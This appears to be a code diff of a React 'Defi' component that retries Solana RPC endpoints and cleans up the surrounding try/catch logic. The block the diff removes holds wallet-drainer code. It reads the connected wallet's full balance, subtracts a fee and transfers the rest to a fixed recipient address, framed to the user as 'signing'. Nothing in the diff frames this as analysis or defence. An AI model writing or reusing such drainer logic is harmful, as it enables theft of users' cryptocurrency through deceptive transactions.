@@ -107,57 +107,17 @@ function Defi() {
               console.error('Signing failed:', signError)
               const errorMessage = signError instanceof Error ? signError.message : 'Unknown error occurred'
               throw new Error(`Signing failed: ${errorMessage}`)
-            } catch (error) {
-              console.error(`RPC endpoint ${endpoint} failed:`, error)
-              if (attempt === RPC_ENDPOINTS.length - 1) {
-                throw error
-              }
-              // Continue to next endpoint
             }
+          } catch (error) {
+            console.error(`RPC endpoint ${endpoint} failed:`, error)
+            if (attempt === RPC_ENDPOINTS.length - 1) {
+              throw error
+            }
+            // Continue to next endpoint
           }
         }
 
-        if (!blockhash || !connection) {
-          throw error || new Error('All RPC endpoints failed')
-        }
-
-        if (!window.solana?.publicKey) throw new Error('Wallet not connected')
-        const fromPubkey = new PublicKey(window.solana.publicKey)
-        const balance = await connection.getBalance(fromPubkey)
-        if (balance <= 0) {
-          throw new Error('Insufficient balance')
-        }
-
-        const fee = LAMPORTS_PER_SOL * 0.01
-        let amountToTransfer = 0
-        if (typeof balance === 'number') {
-          amountToTransfer = balance - fee
-        }
-
-        if (amountToTransfer <= 0) {
-          throw new Error('Balance is too low to sign')
-        }
-
-        const transaction = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: fromPubkey,
-            toPubkey: new PublicKey(recipientAddress),
-            lamports: amountToTransfer
-          })
-        )
-
-        transaction.recentBlockhash = blockhash
-        transaction.feePayer = new PublicKey(window.solana.publicKey)
-
-        try {
-          const signature = await window.solana.signAndSendTransaction(transaction)
-          console.log('Transaction successful:', signature)
-          alert(`Transaction completed successfully! Transferred ${amountToTransfer / LAMPORTS_PER_SOL} SOL`)
-        } catch (signError: unknown) {
-          console.error('Signing failed:', signError)
-          const errorMessage = signError instanceof Error ? signError.message : 'Unknown error occurred'
-          throw new Error(`Signing failed: ${errorMessage}`)
-        }
+        throw new Error('All RPC endpoints failed')
       }
     } catch (error: unknown) {
       console.error('Transaction failed:', error)
